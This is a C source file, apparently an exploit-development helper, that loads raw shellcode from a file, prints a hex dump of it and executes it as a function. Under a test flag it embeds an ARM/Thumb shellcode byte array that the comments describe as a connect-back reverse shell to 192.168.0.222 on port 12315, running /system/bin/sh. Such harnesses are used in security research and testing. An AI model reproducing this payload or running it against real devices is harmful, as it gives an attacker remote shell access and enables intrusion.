/*
  @idhyt
  to run shellcode
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// #define __TEST_SC

#ifdef __TEST_SC

char shellcode[] = {
	/* Enter Thumb mode (for proof of concept) */
	0x01, 0x10, 0x8F, 0xE2, 0x11, 0xFF, 0x2F, 0xE1,

	/* 16-bit instructions follow */
	0x02, 0x20, 0x01, 0x21, 0x92, 0x1A, 0x0F, 0x02, 0x19, 0x37, 0x01,
	0xDF, 0x06, 0x1C, 0x08, 0xA1, 0x10, 0x22, 0x02, 0x37, 0x01, 0xDF,
	0x3F, 0x27, 0x02, 0x21, 0x30, 0x1c, 0x01, 0xdf, 0x01, 0x39, 0xFB,
	0xD5, 0x05, 0xA0, 0x92, 0x1a, 0x05, 0xb4, 0x69, 0x46, 0x0b, 0x27,
	0x01, 0xDF, 0xC0, 0x46,

	/* struct sockaddr */
	0x02, 0x00,
	/* port: 12315 0x301B */
	0x1B, 0x30,
	/* ip: 192.168.0.222 0xDE00A8C0 */
	0xC0, 0xA8, 0x00, 0xDE,

	/* "/system/bin/sh" */
	0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e,
	0x2f, 0x73, 0x68, 0x00
};
#endif

void print(char* data, int len) {
  int x = 0;
  int y = 0;

  if (data == NULL) {
    return;
  }

  for (x = 0; x < len; x += 16) {
    printf("%p : ", &data[x]);

    for (y = 0; y < 16; y++) {
      printf("%2.2x ", *(&data[x] + y) & 0xff);
    }

    printf(" ");

    for (y = 0; y < 16; y++) {
      if (*(&data[x] + y) >= 0x20 && *(&data[x] + y) <= 0x7e) {
        printf("%c", *(&data[x] + y));
      } else {
        printf(".");
      }
    }

    printf("\n");
  }
}

int run_sc(char* sc) {
  /* ret is a function pointer */
  int (*func)();
  printf("Bytes: %d\n", (int)sizeof(sc));
  /* ret points to our shellcode */
  func = (int (*)())sc;
  /*
      shellcode is type caste as a function
      execute, as a function, shellcode[]
   */
  return (int)(*func)();
  /* exit() */
}

int main(int argc, char** argv) {
#ifndef __TEST_SC
  if (argc < 2) {
    printf("input shellcode raw path.\n");
    return -1;
  }

  FILE* fp = fopen(argv[1], "rb");
  if (fp == NULL) {
    printf("read error!\n");
    return -1;
  }
  fseek(fp, 0, SEEK_END);
  int size = ftell(fp);

  char* shellcode = (char*)malloc(size + 1);
  memset(shellcode, 0, size + 1);

  fseek(fp, 0, SEEK_SET);
  fread(shellcode, 1, size, fp);
#else
  int size = sizeof(shellcode);
#endif

  printf("\n---------------- shellcode (0x%x)----------------\n", size);
  print(shellcode, size);
  printf("---------------- end ----------------\n\n");

  return run_sc(shellcode);
  while(1) {}
}
